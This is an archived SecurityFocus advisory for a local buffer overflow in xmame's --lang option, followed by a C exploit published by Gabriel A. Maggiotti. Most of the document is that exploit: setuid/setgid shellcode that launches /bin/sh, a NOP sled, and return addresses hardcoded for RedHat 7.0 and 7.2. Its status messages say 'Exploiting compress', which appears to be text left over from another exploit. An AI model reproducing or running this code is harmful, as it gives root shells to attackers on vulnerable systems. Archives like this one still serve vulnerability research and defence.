source: http://www.securityfocus.com/bid/7773/info

Xmame is prone to a locally exploitable buffer overflow. This is due to insufficient bounds checking of the command line parameter used to specify language settings (--lang). Successful exploitation on some systems could result in execution of malicious instructions with elevated privileges. 

/*
---------------------------------------------------------------------------
Web:  http://qb0x.net                   Author: Gabriel A. Maggiotti
Date: March 31, 2003  	                E-mail: gmaggiot@ciudad.com.ar
---------------------------------------------------------------------------
*/

#include <stdio.h>

#define OFFSET 1058
#define NOP 0x90 
#define NOP1 'B' 
#define RET_70 0xbfffee00  
#define RET_72 0xbfffedf0  

int
main(int argc, char *argv[])
{
int i=0; char buf[OFFSET];
int c, ret;

unsigned char shellcode1[] =
"\x33\xDB\x33\xC0\xB0\x1B\xCD\x80" // alarm(0);
"\x31\xdb\x89\xd8\xb0\x17\xcd\x80" // setuid(0);
"\x31\xc0\x50\x50\xb0\xb5\xcd\x80" // setgid(0);
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";


	if(argc != 2) {
		fprintf(stderr,"usage: %s <os_type> \n",argv[0]);
		fprintf(stderr,"types:\n RedHat 7.0 - [1]");
		fprintf(stderr,"\n RedHat 7.2 - [2]\n\n");
		return 1;
	}
	
	c=atoi(argv[1]);

	switch(c) {
		case 1:
			printf("Exploiting compress for RedHat 7.0\n");
			ret = RET_70 - OFFSET;
			break;	
		case 2:
			printf("Exploiting compress for RedHat 7.2\n");
			ret = RET_72 - OFFSET;
			break;	
	}

	for(i=0;i<=OFFSET-1 ;i++)
		buf[i]=NOP;
	for(i=OFFSET-301;i<=OFFSET-1 ;i+=4)
	*(int *) &buf[i++] = ret;
	memcpy(buf+200,shellcode1,strlen(shellcode1));
	execl("/usr/local/bin/xmame.x11", "/usr/local/bin/xmame.x11","--lang", buf, NULL);

return 0;
}

/*
---------------------------------------------------------------------------
research-list@qb0x.net is dedicated to interactively researching vulnerab-
ilities, report potential or undeveloped holes in any kind of computer system.
To  subscribe to   research-list@qb0x.ne t send a blank  email  to 
research-list-subscribe@qb0x.net. More help  available  sending an email
to research-list-help@qb0x.net.
Note: the list doesn't allow html, it will be stripped from messages. 
---------------------------------------------------------------------------
*/
